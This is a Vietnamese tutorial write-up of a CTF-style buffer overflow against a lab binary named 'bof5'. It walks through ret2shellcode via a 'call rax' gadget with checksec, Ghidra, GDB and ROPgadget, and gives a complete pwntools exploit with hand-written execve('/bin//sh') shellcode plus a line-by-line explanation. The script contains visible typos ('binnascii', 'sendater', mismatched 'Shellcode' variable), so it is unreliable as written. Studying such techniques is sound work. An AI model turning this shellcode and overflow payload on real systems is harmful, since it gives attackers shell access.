I.Mindset khai thác 
- Kỹ thuật ret2shellcode yêu cầu bạn phải biết chính xác địa chỉ của Stack để bẻ lái luồng thực thi(RIP) nhảy vào đó. Nhưng có những trường hợp chương trình bật ASRL(địa chỉ stack sẽ thanh đổi ngẫu nhiên), ta cần phải thêm 1 bước chính là rò rỉ bộ nhớ(`leak`)
- Còn ở phần ret2shellcode không leak này chính là 1 biến thể, nó không cần rò rỉ địa chỉ(leakress) nhờ có các yếu tố sau:
  + Lỗ hổng buffer overflow cho phép ghi đè ngập stack từ vùng biến cục bộ xuống tận `saved RIP`(địa chỉ trả về của hàm)
  + Theo quy ước gọi hàm thì giá trị trả về của các hàm nhập chuỗi (như là `read` hay `get`) là con trỏ tới chính chuỗi đó và được tự lưu vào trong thanh ghi `RAX`. Chương trình sẽ không dọn dẹp biến này, Rax lúc này sẽ như là 1 hướng dẫn trỏ thẳng vào shellcode
  + ROP gadge (call rax): thay vì ghi đè `saved RIP` bằng địa chỉ stack ngẫu nhiên, ta sẽ ghi đè nó bằng địa chỉ tĩnh của lệnh `call rax`, rồi từ đó nó nhảy tới thanh ghi rax , xem địa chỉ mà thanh ghi này đang giữ là gì và nhảy thẳng đến đó để thực thi.
  
II.Phân tích tĩnh và động(Quy trình tìm lỗi)
1. Phân tích tĩnh(Terminal và Ghidra)
   - Kiểm tra cơ chế bảo vệ : Gõ lệnh `checksec.bof5` để xem trạng thái các cờ , ta thấy yếu tố quyết định đến shellcode là cờ NX(Non-Executable) phải ở trạng thái Disabled(Stack có quyền thực thi)
   - Dịch ngược toàn bộ file bằng Ghidra:
     + Mở file tìm đến hàm xử lý chính `run` hoặc `main`
     +  Hàm `main` hoàn toàn bình thường nên ktra sang hàm `run` ta thấy nó có sự bất thường vùng nhớ được cấp phát 524 byte nên việc hàm `read` nhồi 544 byte vào 1 không gian chỉ có 524 byte sẽ gây ra tràn bộ đệm, ta sẽ khai thác ở đây.
     +  <img width="188" height="170" alt="image" src="https://github.com/user-attachments/assets/a7ec0535-ca4b-4a0b-9181-a3221cebc766" />
2.Phân tích động và tìm offset(GDB)
 - Tạo ngẫu nhiên : mở `gdb ./bof5`, gõ `pattern create 544`
 - Kích hoạt tràn bộ đệm: Chạy chương trình(`r`) và dán chuỗi 544 kí tự vừa tạo vào lần nhập payload thứ 2
 - Xác định Offset : Chương trình crash(SIGSEGV) , dùng lệnh `pattern search <giá_trị_tại_rsp>` để tự động tính khoảng cách -> ta sẽ tháy kq là 536 bytes từ đầu cho đến `save rip`
 - Xác minh giả thuyết RAX : tại khoảnh khắc crash , gõ `info registers rax ` hay `i r rax`, nếu RAX trỏ chính xác về chuỗi payload đầu tiên -> điều kiện bẻ khóa thành công
3.Tìm Gadget(Terminal)
- Sử dụng công cụ ROPgadget quét file thực thi để tìm lệnh nhảy luồng: `ROPgadget --binary ./bof5 | grep "call rax"` -> Trích xuất địa chỉ trả về của call rax

III.Xây dựng kịch bản khai thác(Python script)
**Python**
```sh
#!/usr/bin/python3
from pwn import *
from binnascii import hexlify

# 1.Tự động thiết lập kiến trúc x86_64 dựa trên file ELF
context.binary = exe = ELF('./bof5',checksec=False)
p=process()

 # 2.Xây dựng shellcode thủ công (Badchar-Free & Ubuntu 24.04 Compatible)
 Shellcode = asm('''
 # Dọn dẹp thanh ghi môi trường (envp = NULL)
 xor rdx, rdx

 # Đẩy chuỗi "/bin//sh" lên Stack (8 byte, triệt tiêu NULL byte)
 mov rbx, 0x68732f2f6e69622f
 push rbx
 mov rdi, rsp     # rdi(tham số 1) trỏ tới "/bin//sh"

 # Xây dựng mảng argv = ["/bin//sh",NULL] trên đỉnh stack
 push rdx         #  Đẩy phần tử kết thúc mảng(NULL)
 push rdi         # Đẩy địa chỉ của "/bin//sh"
 mov rsi, rsp     # rsi (tham số 2) trỏ tới toàn bộ mảng này

 # Kích hoạt syscall execve (Mã 0x3b = 59)
 push 0x3b
 pop rax
 syscall
''')
print(b"[+] Shellcode hex: " + hexlify(shellcode))

# 3.Địa chỉ gadget và kích hoạt khai thác
call_rax = 0x0000000000401014
# Gửi shellcode mồi. Sử dụng sendafter để kiểm soát byte tĩnh, không thêm \n
p.sendater(b'> ',shellcode)
# Ghi đè 536 byte đệm và chèn địa chỉ call rax vào save rip
payload = b'A' * 536 +p64(call_rax)
p.sendafter(b'> ',payload)

#4. Tương tác với hệ thống
p.interactive()
```
**Ý nghĩa**
# Phân tích Script Khai thác: Kỹ thuật ret2shellcode (Ubuntu 24.04)

Tài liệu này giải thích chi tiết ý nghĩa và logic của từng câu lệnh trong kịch bản khai thác lỗ hổng Buffer Overflow sử dụng kỹ thuật `ret2shellcode`, với thiết kế Shellcode tùy chỉnh để vượt qua rào cản `argv` trên Linux Kernel 6.x+.

---

### 1. Khai báo thư viện và Cấu hình môi trường

*   **`#!/usr/bin/python3`**: Dòng shebang báo cho hệ điều hành biết kịch bản này cần được chạy bằng trình thông dịch Python 3.
*   **`from pwn import *`**: Import toàn bộ sức mạnh của `pwntools` – bộ thư viện tiêu chuẩn dành cho khai thác nhị phân (CTF). Cung cấp các hàm như `ELF`, `process`, `asm`, `p64`, `sendafter`.
*   **`from binascii import hexlify`**: Import hàm `hexlify` để chuyển đổi các byte mã máy thô sang dạng chuỗi Hex dễ đọc (như `4831d2...`), phục vụ cho việc kiểm tra trực quan xem có bị lẫn Null Byte (`\x00`) nào không.
*   **`context.binary = exe = ELF('./bof5', checksec=False)`**: Lệnh thiết lập "hậu phương" cốt lõi. Pwntools sẽ đọc header của file `bof5`, tự động nhận dạng kiến trúc CPU (`x86_64`), thứ tự byte (`Little Endian`), và hệ điều hành (`Linux`). Nhờ dòng này, các hàm `asm()` hay `p64()` ở dưới sẽ tự động lấy cấu hình chuẩn xác mà không cần khai báo thủ công.
*   **`p = process()`**: Ra lệnh khởi chạy file `./bof5` thành một tiến trình (process) ngầm cục bộ, gán vào biến `p` để tương tác (gửi/nhận dữ liệu).

---

### 2. Khối Shellcode (Trái tim của kịch bản)

Lệnh `shellcode = asm(''' ... ''')` lấy các dòng lệnh Assembly và biên dịch chúng thành byte mã máy (opcodes) để CPU thực thi. Ý nghĩa từng dòng Assembly:

*   **`xor rdx, rdx`**: Phép XOR một thanh ghi với chính nó luôn trả về `0`. Lệnh này dọn sạch thanh ghi `RDX` (tham số thứ 3 của `execve` - biến môi trường `envp`) về NULL. Mã máy sinh ra rất sạch, không dính Null Byte.
*   **`mov rbx, 0x68732f2f6e69622f`**: Nạp mã hex của chuỗi `/bin//sh` (đọc ngược theo Little Endian) vào thanh ghi `RBX`. Việc dùng 2 dấu `//` giúp chuỗi dài đúng 8 byte, lấp đầy thanh ghi 64-bit mà không sinh ra byte `00` đệm.
*   **`push rbx`**: Quăng chuỗi `/bin//sh` từ `RBX` lên đỉnh ngăn xếp (Stack).
*   **`mov rdi, rsp`**: `RSP` luôn trỏ vào đỉnh Stack hiện tại. Lệnh này copy địa chỉ đỉnh Stack đưa vào `RDI`. Vậy là `RDI` (tham số thứ 1 - tên chương trình) đã trỏ đúng vào chuỗi `/bin//sh`.
*   **`push rdx`**: Đẩy số `0` (NULL, từ `RDX`) lên Stack làm phần tử kết thúc của mảng `argv`.
*   **`push rdi`**: Đẩy địa chỉ của chuỗi `/bin//sh` lên Stack. Lúc này trên đỉnh Stack hình thành một mảng gồm 2 phần tử: `[địa_chỉ_chuỗi, NULL]`.
*   **`mov rsi, rsp`**: Copy địa chỉ mảng vừa tạo trên đỉnh Stack đưa vào `RSI`. Vậy là `RSI` (tham số thứ 2 - mảng `argv`) đã được thiết lập hợp lệ, vượt qua cơ chế kiểm tra ngặt nghèo của Ubuntu 24.04.
*   **`push 0x3b / pop rax`**: Thay vì dùng `mov rax, 0x3b` (sinh ra nhiều Null Byte như `b8 3b 00 00...`), kỹ thuật này đẩy số `0x3b` (mã syscall của `execve`) lên Stack rồi rút ngược vào `RAX`. Mã máy tốn 3 byte (`6a 3b 58`) và sạch hoàn toàn.
*   **`syscall`**: Gọi nhân hệ điều hành, yêu cầu thực thi `execve` với 3 tham số đã dàn xếp trong `RDI`, `RSI`, và `RDX`.

---

### 3. Khối Giao tiếp và Ghi đè (Khai thác lỗ hổng)

*   **`call_rax = 0x0000000000401014`**: Lưu địa chỉ tĩnh của ROP Gadget `call rax` thu thập được từ bước phân tích (`ROPgadget`).
*   **`p.sendafter(b'> ', shellcode)`**: Bảo Python chờ dấu nhắc `> ` rồi bơm shellcode vào. Dùng `sendafter` (thay vì `sendlineafter`) để gửi chính xác số byte, không bị độn thêm phím Enter (`\n`), tránh sai lệch bộ nhớ. Dữ liệu chui vào biến `param_1`, và chương trình gán địa chỉ này vào `RAX` thông qua lệnh `return`.
*   **`payload = b'A' * 536 + p64(call_rax)`**: Lắp ráp viên đạn ghi đè. Gồm 536 byte rác (chữ 'A') lấp đầy khoảng cách từ mảng `local_218` tràn xuống đáy frame, tiếp nối bằng địa chỉ lệnh `call rax`. Hàm `p64()` tự động đóng gói `0x401014` thành 8 byte (`Little Endian`) để đè khít lên `saved RIP`.
*   **`p.sendafter(b'> ', payload)`**: Đợi chương trình hỏi câu thứ hai, tiến hành bắn khối payload tràn bộ đệm. Khi hàm `run` kết thúc, CPU nhặt `saved RIP` bị đè lên chạy $\rightarrow$ kích hoạt `call rax` $\rightarrow$ ném quyền điều khiển vào shellcode ở lần 1.

---

### 4. Khối Tương tác cuối cùng

*   **`p.interactive()`**: Sau khi shellcode chạy thành công và biến tiến trình `bof5` thành shell `/usr/bin/dash`, lệnh này chuyển quyền điều khiển ống dẫn (pipe) từ Python sang bàn phím. Cho phép gõ trực tiếp các lệnh như `/bin/ls` hay `/bin/cat flag.txt` trên Terminal.
